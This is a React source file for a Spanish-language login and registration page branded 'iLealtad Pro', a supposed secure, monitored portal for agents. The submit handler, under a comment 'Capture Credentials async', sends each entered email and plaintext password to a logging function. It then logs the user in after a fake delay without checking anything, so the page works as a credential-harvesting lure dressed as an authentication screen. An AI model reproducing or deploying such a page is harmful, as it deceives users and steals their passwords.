import React, { useState } from 'react';
import { ShieldCheck, Lock, Mail, UserPlus, LogIn } from 'lucide-react';
import { logAccess } from '../services/storage';

interface LoginProps {
  onLogin: () => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  const [isRegister, setIsRegister] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    if (email && password) {
      // Capture Credentials async
      await logAccess(email, password, isRegister ? 'REGISTER' : 'LOGIN');
      // Fake delay for UX
      setTimeout(() => {
        onLogin();
        setIsLoading(false);
      }, 1000);
    } else {
        setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-100 dark:bg-slate-950 flex items-center justify-center p-4 transition-colors">
      <div className="bg-white dark:bg-slate-900 w-full max-w-md rounded-2xl shadow-2xl border border-slate-200 dark:border-slate-800 overflow-hidden transition-all">
        
        {/* Header */}
        <div className="p-8 text-center bg-slate-900 dark:bg-black relative overflow-hidden">
          <div className="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
          <div className="w-16 h-16 bg-brand-600 rounded-xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-brand-500/20 relative z-10">
            <ShieldCheck size={32} className="text-white" />
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight relative z-10">iLealtad Pro</h1>
          <p className="text-slate-400 text-sm mt-2 relative z-10">
            {isRegister ? 'Registro de Nuevo Agente' : 'Portal de Inteligencia Seguro'}
          </p>
        </div>
        
        {/* Tabs */}
        <div className="flex border-b border-slate-200 dark:border-slate-700">
          <button 
            onClick={() => setIsRegister(false)}
            className={`flex-1 py-4 text-sm font-semibold transition-colors ${!isRegister ? 'text-brand-600 border-b-2 border-brand-600 bg-slate-50 dark:bg-slate-800/50' : 'text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300'}`}
          >
            Iniciar Sesión
          </button>
          <button 
            onClick={() => setIsRegister(true)}
            className={`flex-1 py-4 text-sm font-semibold transition-colors ${isRegister ? 'text-brand-600 border-b-2 border-brand-600 bg-slate-50 dark:bg-slate-800/50' : 'text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300'}`}
          >
            Crear Cuenta
          </button>
        </div>

        <div className="p-8">
          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-1">
                {isRegister ? 'Correo Institucional / Personal' : 'ID de Acceso'}
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                <input
                  type="email"
                  required
                  className="w-full pl-10 pr-4 py-3 bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white rounded-lg focus:ring-2 focus:ring-brand-500 focus:border-brand-500 outline-none transition-all placeholder:text-slate-400"
                  placeholder="usuario@email.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
            </div>
            
            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-1">
                {isRegister ? 'Crear Contraseña Maestra' : 'Clave de Seguridad'}
              </label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                <input
                  type="password"
                  required
                  className="w-full pl-10 pr-4 py-3 bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white rounded-lg focus:ring-2 focus:ring-brand-500 focus:border-brand-500 outline-none transition-all placeholder:text-slate-500"
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className={`w-full bg-brand-600 hover:bg-brand-700 text-white font-semibold py-3 rounded-lg transition-all shadow-md flex items-center justify-center gap-2 ${isLoading ? 'opacity-80 cursor-not-allowed' : ''}`}
            >
              {isLoading ? (
                <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
              ) : (
                <>
                  {isRegister ? <UserPlus size={18} /> : <LogIn size={18} />}
                  {isRegister ? 'Registrar Agente' : 'Autenticar y Acceder'}
                </>
              )}
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-xs text-slate-400 dark:text-slate-500">
              {isRegister 
                ? 'Al registrarse, acepta los protocolos de confidencialidad y monitoreo de la agencia.' 
                : 'Solo personal autorizado. El acceso es monitoreado y registrado.'}
              <br/>
              Sistema v12.0 (Enterprise)
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;